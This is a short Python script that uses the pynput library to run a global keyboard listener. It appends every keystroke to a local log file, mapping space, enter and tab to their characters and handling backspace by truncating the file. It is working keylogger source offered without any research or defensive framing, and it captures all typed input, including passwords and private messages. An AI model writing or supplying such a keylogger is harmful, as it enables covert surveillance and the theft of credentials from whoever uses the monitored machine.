from pynput import keyboard
import os

def keyPressed(key):
    log_file_path = "key_loger/key_log.txt"
    with open(log_file_path, "a+") as logkey:
        try:
            if hasattr(key, 'char'):
                logkey.write(key.char)
            else:
                # Handle special keys
                if key == keyboard.Key.space:
                    logkey.write(' ')
                elif key == keyboard.Key.enter:
                    logkey.write('\n')
                elif key == keyboard.Key.tab:
                    logkey.write('\t')
                elif key == keyboard.Key.backspace:
                    logkey.seek(0, os.SEEK_END)
                    pos = logkey.tell()
                    if pos > 0:
                        logkey.seek(pos - 1)
                        last_char = logkey.read(1)
                        if last_char.isalnum():
                            logkey.seek(pos - 1)
                            logkey.truncate()
                else:
                    logkey.write(f'[{str(key)}]')
            
        except Exception as e:
            print(f"Error Getting Key: {e}")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    try:
        while True:
            pass
    except KeyboardInterrupt:
        listener.stop()

